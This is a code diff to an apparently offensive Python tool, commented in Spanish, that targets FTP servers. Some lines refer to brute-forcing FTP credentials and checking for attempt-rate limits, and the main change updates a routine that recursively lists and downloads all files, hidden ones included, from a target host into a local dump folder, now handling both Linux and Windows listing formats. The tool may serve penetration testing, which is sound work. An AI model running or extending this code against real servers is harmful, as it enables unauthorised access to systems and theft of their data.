@@ -181,7 +181,7 @@ def mini_bruteforce(target_ip):
     if limite_libre and not encontrado:
         ftp_elaborate_bruteforce(target_ip)
     elif not limite_libre:
-        print("[*] No se realizará el brute force elaborado debido a posible limitación de intentos.")
+        print("[!] No se realizará el brute force elaborado debido a posible limitación de intentos.")
 
 
 def ftp_elaborate_bruteforce(target_ip):
@@ -332,30 +332,37 @@ def ftp_elaborate_bruteforce(target_ip):
 def dump_ftp_contents(ftp, target_ip, remote_path="/", local_path=None):
     if local_path is None:
         local_path = f"logs/{target_ip}/ftp/dump/"
-
     os.makedirs(local_path, exist_ok=True)
 
     try:
         ftp.cwd(remote_path)
-        # Lista completa de archivos y carpetas, incluyendo ocultos
         file_list = []
         ftp.retrlines("LIST -a", file_list.append)
 
         for line in file_list:
             parts = line.split()
-            name = " ".join(parts[8:])  # El nombre del archivo puede contener espacios
-            file_type = parts[0][0]     # Primer carácter indica tipo (d=directorio, -=archivo)
+            if len(parts) < 4:
+                continue  # Omitir líneas sin información relevante
+
+            # Si la primera columna tiene 10 caracteres y comienza con 'd', '-' o 'l', asumimos formato Linux
+            if len(parts[0]) == 10 and parts[0][0] in ["d", "-", "l"]:
+                # Casuística Linux
+                is_dir = parts[0].startswith("d")
+                name = " ".join(parts[8:])
+            else:
+                # Casuística Windows
+                is_dir = parts[2].upper() == "<DIR>"
+                name = " ".join(parts[3:])
 
             if name in [".", ".."]:
-                continue  # Omitir enlaces a directorios padre/actual
+                continue
 
-            remote_item_path = f"{remote_path}/{name}".replace("//", "/")  # Asegurar formato correcto
-
-            if file_type == "d":  # Si es un directorio
+            remote_item_path = f"{remote_path}/{name}".replace("//", "/")
+            if is_dir:
                 new_local_path = os.path.join(local_path, name)
                 os.makedirs(new_local_path, exist_ok=True)
                 dump_ftp_contents(ftp, target_ip, remote_item_path, new_local_path)
-            else:  # Si es un archivo, lo descargamos
+            else:
                 local_file = os.path.join(local_path, name)
                 try:
                     with open(local_file, "wb") as f:
@@ -363,7 +370,6 @@ def dump_ftp_contents(ftp, target_ip, remote_path="/", local_path=None):
                     print(f"[+] Archivo descargado: {local_file}")
                 except Exception as e:
                     print(f"[!] Error al descargar {name}: {e}")
-
     except Exception as e:
         print(f"[!] Error al listar archivos en {remote_path}: {e}")
 
